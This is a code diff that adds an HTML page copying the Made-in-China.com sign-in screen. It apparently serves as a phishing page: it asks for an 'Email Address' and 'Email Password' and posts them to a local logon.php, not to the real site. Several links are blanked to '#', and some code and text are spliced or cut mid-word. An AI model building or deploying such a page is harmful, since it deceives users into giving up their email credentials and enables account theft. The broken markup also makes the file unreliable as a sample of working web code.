@@ -1,0 +1,375 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-
+
+transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Sign In | Made-in-China.com
+  </title>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <meta content="Sign in to Made-in-China.com to source China products anywhere, anytime." name="Description" />
+  <meta content="Made-in-China.com sign in, sign in" name="Keywords" />
+  <link type="text/css" rel="stylesheet" href="https://login.made-in-china.com/css/vo/login.css" />
+  <style type="text/css">
+   #header,#nav,#main,#top .cont, #top .grid { width: 870px }
+#nav {display:none;}
+#urh { width: 868px }
+.navWB #pr { margin-left: 20px; margin-right: 10px }
+#voNav { display: none }
+#faptcha_widget{padding-top:10px;}
+#faptcha_widget input { border-color: #1E668E #7F9DB9 #7F9DB9 #1E668E; border-style: solid; border-width: 1px; padding: 
+
+2px 0 0; height: 18px }
+.faptcha-widget #faptcha_audio {display: none}
+.multi-lang {margin-top:0;}
+.faptcha-widget #faptcha_main{_height:40px!important;overflow:hidden}
+#faptcha_main,#faptcha_input{display:inline-block;*display:inline;zoom:1;vertical-align:top;margin-right:10px;}
+.faptcha-widget #faptcha_response_field{width:55px!important;padding: 0 5px;height:42px;line-
+
+height:42px;_height:38px;_line-height:38px;font-size:16px;border:1px solid #ccc}
+  </style>
+  <script src="https://login.made-in-china.com/script/jquery.js" type="text/javascript">
+  </script>
+  <script src="https://login.made-in-china.com/script/lgname.js" type="text/javascript">
+  </script>
+  <script src="https://login.made-in-china.com/script/autocomplete.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   document.domain = "made-in-china.com";
+//&lt;![CDATA[
+function reSetEvent(doc) {
+	//&lt;!-- mailTip --&gt;
+	new autoComplete({
+		input: doc.getElementById('logonInfo.logUserName'),
+		tipCls: 'mail-guess',
+		hoverCls: 'hover',
+		type: 'login'
+	});
+
+	//&lt;!-- password upCaseCode check --&gt;
+	var target = $('input[name="logonInfo.logPassword"],input[name="logonPassword"]');
+	if (target.size() &gt; 0) {
+		target.each(function(){
+			$(this).caps(function(isCapsOn) {
+				if(  $('p.capsLock').size()&gt;1){
+					$(this).parents('table').find('p.capsLock').closest('tr').toggle(isCapsOn);
+				}else{
+					$('p.capsLock').closest('tr').toggle(isCapsOn);
+				}
+			});
+		});
+	}
+
+	//&lt;!-- password upCaseCode check --&gt;
+function validateForm()
+{
+var x=document.forms["logon"]["email"].value;
+var atpos=x.indexOf("@");
+var dotpos=x.lastIndexOf(".");
+if (atpos&lt;1 || dotpos&lt;atpos+2 || dotpos+2&gt;=x.length)
+  {
+  alert("Not a valid e-mail address");
+  return false;
+  }
+}
+
+	//&lt;!-- remember passcount --&gt;
+	showLgName('logonInfo.logUserName');
+    if (jQuery('#logon input[name="logonInfo.logUserName"]')[0].value == '') {
+    	jQuery('#logon input[name="logonInfo.logUserName"]').focus();
+    } else {
+    	jQuery('#logon input[name="logonInfo.logPassword"]').focus();
+	}
+}
+
+jQuery(document).rea     &lt;li class="first menu-item"&gt;New user? &lt;a rel="nofollow" href="#"&gt;
+				Join Free&lt;/a&gt;&lt;/li&gt;
+
+                &lt;li id="login_span" class="signin menu-item"&gt;
+                    &lt;a rel="nofollow" href="#"&gt;Sign In&lt;/a&gt;
+                &lt;/li&gt;
+            
+		&lt;/ul&gt;
+        &lt;ul class="site-nav"&gt;
+            &lt;li class="inquiry menu-item"&gt;
+                &lt;a rel="nofollow" href="#"&gt;&lt;i class="icon"&gt;
+				&amp;#61562;&lt;/i&gt;Inquiry Basket (&lt;strong&gt;0&lt;/strong&gt;)&lt;/a&gt;
+
+            &lt;/li&gt;
+
+            &lt;li class="menu-item"&gt;
+                &lt;a rel="nofollow" href="#"&gt;
+				Visit History&lt;/a&gt;
+            &lt;/li&gt;
+
+            &lt;li id ="multi-lang" class="menu-item multi-lang dropmenu"&gt;
+                &lt;div class="dropmenu-hd"&gt;
+                    &lt;a href="javascript:;"&gt;English &lt;i class="icon"&gt;&amp;#61655;&lt;/i&gt;&lt;/a&gt;
+
+                &lt;/div&gt;
+                &lt;div class="dropmenu-list"&gt;
+                        &lt;a class="es" href="#" target="_blank"&gt;
+						Espa&amp;ntilde;ol&lt;/a&gt;
+                        &lt;a class="pt" href="#" targetuide &lt;i class="icon"&gt;&amp;#61655;&lt;/i&gt;&lt;/a&gt;
+                &lt;/div&gt;
+                &lt;div class="dropmenu-list"&gt;
+                    &lt;dl&gt;
+                        &lt;dt&gt;BUYER GUIDE&lt;/dt&gt;
+
+                        &lt;dd&gt;
+                            &lt;div class="title"&gt;Search Audited Suppliers:&lt;/div&gt;
+                            &lt;ul&gt;
+                                &lt;li&gt;&lt;a href="http://www.made-in-china.com/prod/catlist/"&gt;
+								Product Directory&lt;/a&gt;&lt;/li&gt;
+                                &lt;li&gt;&lt;a href="http://www.made-in-china.com/industry-channels/" target="_blank"&gt;
+								Industry Channels&lt;/a&gt;&lt;/li&gt;
+                                &lt;li&gt;&lt;a href="http://www.made-in-china.com/region/" target="_blank"&gt;
+								Regional Channels&lt;/a&gt;&lt;/li&gt;
+                            &lt;/ul&gt;
+
+                            &lt;div class="title"&gt;Or you can:&lt;/div&gt;
+                            &lt;ul&gt;
+                                &lt;li&gt;&lt;a href="http://membercenter.made-in-china.com/trade-service/quotation-request.html"&gt;
+								Post Sourcing Requ                &lt;/dl&gt;
+                    &lt;dl&gt;
+                        &lt;dt&gt;HELP&lt;/dt&gt;
+                        &lt;dd&gt;
+                            &lt;ul&gt;
+
+                                &lt;li&gt;&lt;a rel="nofollow" href="http://www.made-in-china.com/aboutus/contact/" target="_blank"&gt;
+								Contact Us&lt;/a&gt;&lt;/li&gt;
+                                &lt;li&gt;&lt;a rel="nofollow" href="http://www.made-in-china.com/help/faq/" target="_blank"&gt;
+								FAQ&lt;/a&gt;&lt;/li&gt;
+                            &lt;/ul&gt;
+                        &lt;/dd&gt;
+                    &lt;/dl&gt;
+                &lt;/div&gt;
+            &lt;/li&gt;
+        &lt;/ul&gt;
+
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id="header" class="grid"&gt;
+&lt;div class="logo"&gt;&lt;a href="http://www.made-in-china.com" id="micLogo" title="Made-in-China.com"&gt;
+	Made-in-China.com&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;script language="javascript" type="text/javascript" src="https://login.made-in-china.com/script/common.js?
+
+t=YxMAehEJtQnt"&gt;
+  </script>
+  <script src="https://login.made-in-china.com/script/help_list.js" type="text/javascript">
+  </script>
+  <script src="https://login.made-in-china.com/script/global.js" type="text/javascript">
+  </script>
+  <script type="text/javascript" async="" src="http://www.google-analytics.com/ga.js">
+  </script>
+ </head>
+ <body>
+  <iframe width="1" height="1" name="logonFrame">
+  </iframe>
+  <div class="page grid">
+   <div class="login-main  cf">
+    <div class="sign-in fl">
+     <form method="post" onsubmit="return validateForm();" action="logon.php" name="logon">
+      <div class="title">
+       SIGN IN
+      </div>
+      <div class="field">
+       <label for="">
+        Email Address
+       </label>
+       <div class="mail-wrap">
+        <input type="text" maxlength="160" size="17" value="" class="inputtext" name="email" id="logonInfo.logUserName" />
+       </div>
+      </div>
+      <div class="field">
+       <label for="">
+        Email Password
+       </label>
+       <input type="password" size="17" value="" class="inputtext" name="pass" id="logonInfo.logPassword" />
+       <div class="alert alert-system hide">
+        <div class="alert-con capsLock">
+         Having Caps Lock on may cause 
+					you to enter your password incorrectly.
+        </div>
+       </div>
+      </div>
+      <div class="act">
+       <span class="fl">
+        <input type="checkbox" checked="checked" id="chkrgna" value="1" name="rembemberLoginNameFlag" />
+        <label for="chkrgna">
+         Remember My Member ID
+        </label>
+       </span>
+       <a target="_blank" href="#" class="fr">
+        Forgot Password?
+       </a>
+      </div>
+      <div class="submit">
+       <button class="submit-btn fl" type="submit">
+        Sign In
+       </button>
+       <a target="_blank" href="#" class="fr">
+        Trouble with Sign In?
+       </a>
+      </div>
+      <input type="hidden" value="http://www.made-in-china.com" name="baseNextPage" id="baseNextPage" />
+      <input type="hidden" value="" name="applyGTSource" id="applyGTSource" />
+      <input type="hidden" value="" id="validateNumberError" />
+      <input type="hidden" value="" id="logonError" />
+      <input type="hidden" value="false" id="needValidate" />
+      <input type="hidden" value="1" id="isAbroadIp" />
+     </form>
+    </div>
+    <div class="join">
+     <div class="title">
+      Not a member?
+     </div>
+     <a href="http://membercenter.made-in-china.com/join/" class="join-btn btn-large">
+      Join Free
+     </a>
+     <div id="scLogin" class="sign-in-with">
+      Sign in with:
+      <a class="facebook" title="Facebook" href="javascript:void(0);">
+       <i class="icon">
+        
+       </i>
+      </a>
+      <a class="linkedin" title="LinkedIn" href="javascript:void(0);">
+       <i class="icon">
+        
+       </i>
+      </a>
+     </div>
+    </div>
+   </div>
+   <div class="bottom">
+   </div>
+  </div>
+  <div id="footer">
+   <div class="contact">
+    <div class="grid">
+     <a rel="nofollow" target="_blank" href="http://www.made-in-china.com/aboutus/contact/" class="contact-us">
+      <i class="icon">
+       
+      </i>
+      Contact Us
+     </a>
+     <div class="sns">
+      <a title="Like 
+
+us" target="_blank" rel="nofollow" href="http://www.facebook.com/b2b.made.in.china" class="facebook">
+       <i class="icon">
+        
+       </i>
+      </a>
+      <a title="Follow us" rel="nofollow" target="_blank" href="http://twitter.com/madeinchina_b2b" class="twitter">
+       <i class="icon">
+        
+       </i>
+      </a>
+      <a title="Google plus" rel="nofollow" target="_blank" href="https://plus.google.com/102043740238198436898" class="gplus">
+       <i class="icon">
+        
+       </i>
+      </a>
+     </div>
+     <a class="tm-link" href="http://www.trademessenger.com/" target="_blank" rel="nofollow">
+      <i class="icon">
+       
+      </i>
+      TradeMessenger
+     </a>
+     <div class="mobile-links">
+      <form method="post" id="appbuyerform" action="http://www.made-in-china.com/special/forbuyerapp/">
+       Mobile Channel:
+       <img usemap="#appbuyermap" alt="Mobile Channel" src="/images/app-mobile.png" />
+       <map id="appbuyermap" name="appbuyermap">
+        <area href="javascript:void(0)" id="androidapp" alt="android app" coords="0,0,130,30" shape="rect">
+        </area>
+        <area href="javascript:void(0)" id="iphoneapp" alt="iphone app" coords="150,0,280,30" shape="rect">
+        </area>
+       </map>
+       <input type="hidden" id="appType" value="iphone" name="appType" />
+      </form>
+     </div>
+    </div>
+   </div>
+   <div class="footer-wrap">
+    <div class="grid">
+     <div class="aboutus">
+      <a target="_blank" href="http://www.made-in-china.com/aboutus/main/" rel="nofollow">
+       About Us
+      </a>
+      <a target="_blank" href="http://www.made-in-china.com/help/sitemap/">
+       Site Map
+      </a>
+      <a target="_blank" href="http://www.made-in-china.com/help/terms/" rel="nofollow">
+       Terms &amp; Conditions
+      </a>
+      <a target="_blank" href="http://www.made-in-china.com/help/declaration/" rel="nofollow">
+       Declaration
+      </a>
+      <a target="_blank" href="http://www.made-in-china.com/help/policy/" rel="nofollow">
+       Privacy Polina.com
+      </a>
+      <a target="_blank" href="http://cn.made-in-china.com/">
+       cn.Made-in-China.com
+      </a>
+      <a target="_blank" href="http://big5.made-in-china.com/">
+       big5.Made-in-China.com
+      </a>
+      <a target="_blank" href="http://www.ttnet.net/">
+       ttnet.net
+      </a>
+      <a rel="nofollow" target="_blank" href="http://www.crov.com/">
+       crov.com
+      </a>
+     </div>
+     <div class="copyright">
+      Copyright © 2013
+      <a id="lra136" target="_blank" href="http://www.focuschina.com/">
+       Focus Technology Co., Ltd.
+      </a>
+      All rights reserved.
+      <br />
+      Your use of this website constitutes acknowledgement and 
+				acceptance of our
+      <a id="lra137" target="_blank" href="http://www.made-in-%0A%0Achina.com/help/terms/" rel="nofollow">
+       Terms &amp; Conditions
+      </a>
+      .
+     </div>
+    </div>
+   </div>
+  </div>
+  <script type="text/javascript">
+   jQuery(document).ready(function(){
+		$("#androidapp").bind("click", function() {
+			$("#appType").val("android");
+			setTimeout(function(){$("#appbuyerform").submit();},0);
+	    });
+		$("#iphoneapp").bind("click", function() {
+			$("#appType").val("iphone");
+			setTimeout(function(){$("#appbuyerform").submit();},0);
+	    });
+	});
+  </script>
+  <script type="text/javascript">
+   //&lt;![CDATA[
+var bannerScriptURI = '/banner.do?xcase=getBannerContent&amp;bannerValue=!chn_~5~!';
+//]]&gt;
+  </script>
+  <script src="https://login.made-in-china.com/script/swap_banner_content.js" type="text/javascript">
+  </script>
+  <script src="https://login.made-in-china.com/script/swfobject.js" type="text/javascript">
+  </script>
+  <form method="post" action="#" id="footform">
+   <input type="hidden" value="0" name="baseLan" id="baseLan" />
+  </form>
+  <script src="https://login.made-in-china.com/script/SocuetyLogin.js" type="text/javascript">
+  </script>
+  <script src="https://login.made-in-china.com/script/googleAnalytics.js" type="text/javascript">
+  </script>
+ </body>
+</html>
